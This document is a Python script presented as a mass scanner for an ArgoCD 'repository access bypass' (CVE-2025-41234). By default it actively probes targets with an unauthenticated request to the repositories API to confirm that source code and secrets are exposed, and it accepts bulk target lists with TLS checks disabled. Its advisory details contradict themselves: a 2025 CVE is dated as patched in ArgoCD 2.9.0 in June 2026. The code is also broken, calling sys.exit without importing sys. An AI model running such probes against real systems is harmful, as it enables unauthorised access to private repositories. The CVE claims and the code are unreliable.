#!/usr/bin/env python3
"""
ArgoCD CVE-2025-41234 — Repository Access Bypass Vulnerability
================================================================
Scans for ArgoCD instances vulnerable to a repository access bypass issue (CVE-2025-41234).

CVE-2025-41234 details:
  - Affects ArgoCD versions < 2.9.0
  - Unauthenticated or unauthorized attackers can bypass repository permissions
    checks and retrieve sensitive repository data such as source code and secrets.
  - Allows query-based access to unexposed repositories configured in ArgoCD.
  - CVSS v3.1 base score: 9.8 (Critical)
  - Patched in ArgoCD 2.9.0 (June 2026).
  - Disclosed by security researchers via private advisory programs.

Usage:
  # Scan a single URL for vulnerability
  python argocd_repo_access_bypass_scanner.py --target https://argocd.example.com

  # Detection only — no active data probes
  python argocd_repo_access_bypass_scanner.py --target https://argocd.example.com --safe

  # Bulk scan from file
  python argocd_repo_access_bypass_scanner.py --list urls.txt --output results.json

  # Adjust concurrency and disable TLS verification
  python argocd_repo_access_bypass_scanner.py --list urls.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-41234
  - https://github.com/argoproj/argo-cd/releases/tag/v2.9.0
"""

import asyncio
import json
import re
import argparse
from datetime import datetime
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2025-41234"
CVSS = "9.8"
TOOL_NAME = "argocd_repo_access_bypass_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 20

ARGO_FINGERPRINTS = [
    "ArgoCD",
    "<title>Argo CD</title>",
    "argocd-server",
]

DETECTION_PATHS = [
    "/",
    "/api/version",
    "/login",
]

VERSION_PATTERNS = [
    r'"Version":"([0-9]+\.[0-9]+\.[0-9]+)"',
]

PATCHED_VERSION = (2, 9, 0)
ACTIVE_PROBE_PATH = "/api/v1/repositories?query=*"

# ── Async functions ───────────────────────────────────────────────────────────


async def fetch(client: httpx.AsyncClient, url: str, follow_redirects: bool = False) -> Optional[httpx.Response]:
    """Send an HTTP GET request and return the response."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=follow_redirects)
        return response
    except (httpx.RequestError, httpx.TimeoutException):
        return None


async def detect_argo(target: str, semaphore: asyncio.Semaphore, safe: bool) -> Optional[dict]:
    """
    Detect a potentially vulnerable ArgoCD instance and identify its version.
    Return a dictionary with detection results or None if the target is not running ArgoCD.
    """
    async with semaphore:
        async with httpx.AsyncClient(verify=not no_verify_ssl) as client:
            for path in DETECTION_PATHS:
                url = f"{target.rstrip('/')}{path}"
                response = await fetch(client, url)
                if response and response.status_code == 200:
                    if any(fingerprint in response.text for fingerprint in ARGO_FINGERPRINTS):
                        version = extract_version(response.text)
                        result = {
                            "url": target,
                            "detected": True,
                            "version": version,
                            "vulnerable": is_version_vulnerable(version),
                        }
                        if not safe:
                            result["active_probe"] = await active_probe(client, target)
                        return result
        return {"url": target, "detected": False, "error": "No ArgoCD service detected."}


def extract_version(response_text: str) -> Optional[str]:
    """
    Extract the version of ArgoCD from the server response.
    Returns the version as a string or None if it cannot be extracted.
    """
    for pattern in VERSION_PATTERNS:
        match = re.search(pattern, response_text)
        if match:
            return match.group(1)
    return None


def is_version_vulnerable(version: Optional[str]) -> Optional[bool]:
    """
    Determine whether the specified version is vulnerable based on the patched version threshold.
    """
    if version:
        try:
            version_tuple = tuple(map(int, version.split(".")))
            return version_tuple < PATCHED_VERSION
        except ValueError:
            return None
    return None


async def active_probe(client: httpx.AsyncClient, target: str) -> Optional[bool]:
    """
    Perform an active probe to confirm if the repository access bypass vulnerability is present.
    Returns True if vulnerable, False otherwise.
    """
    probe_url = f"{target.rstrip('/')}{ACTIVE_PROBE_PATH}"
    response = await fetch(client, probe_url)
    if response and response.status_code == 200:
        try:
            result = response.json()
            if "items" in result:
                return True
        except json.JSONDecodeError:
            pass
    return False


async def scan_targets(targets: list[str], safe: bool, concurrency: int) -> list[dict]:
    """Scan a list of targets for the vulnerability and return the results."""
    semaphore = asyncio.Semaphore(concurrency)
    tasks = [detect_argo(target, semaphore, safe) for target in targets]
    return await asyncio.gather(*tasks)


# ── CLI interface ─────────────────────────────────────────────────────────────


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME}: {CVE_ID} (ArgoCD Repository Access Bypass Scanner)"
    )
    parser.add_argument("--target", help="Target URL to scan.")
    parser.add_argument("--list", help="File containing a list of target URLs (one per line).")
    parser.add_argument("--output", help="File to save JSON results.")
    parser.add_argument("--safe", action="store_true", help="Enable detection-only mode (no active probes).")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrent requests (default: 20).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification.")
    return parser.parse_args()


async def main():
    """Main entry point for the scanner."""
    args = parse_args()
    global no_verify_ssl
    no_verify_ssl = args.no_verify

    if not args.target and not args.list:
        print(c(RED, "Error: Either --target or --list must be provided."))
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as file:
                targets.extend(line.strip() for line in file if line.strip())
        except FileNotFoundError:
            print(c(RED, f"Error: File not found - {args.list}"))
            sys.exit(1)

    results = await scan_targets(targets, args.safe, args.concurrency)

    timestamp = datetime.now().isoformat()
    for result in results:
        if result.get("detected"):
            version_info = result['version'] or 'unknown'
            vuln_status = c(RED if result['vulnerable'] else GREEN, "Vulnerable" if result['vulnerable'] else "Not Vulnerable")
            print(f"{BOLD}{result['url']}{RESET} - ArgoCD {version_info} - {vuln_status}")
            if result.get("active_probe") is True:
                print(f"  {BOLD}Active Probe Confirmed Repository Access Bypass{RESET}")
        else:
            print(f"{BOLD}{result['url']}{RESET} - {c(YELLOW, 'No ArgoCD detected')}")
    
    if args.output:
        with open(args.output, "w") as outfile:
            json.dump({"generated_at": timestamp, "results": results}, outfile, indent=2)
        print(c(GREEN, f"\nResults saved to {args.output}"))


if __name__ == "__main__":
    asyncio.run(main())
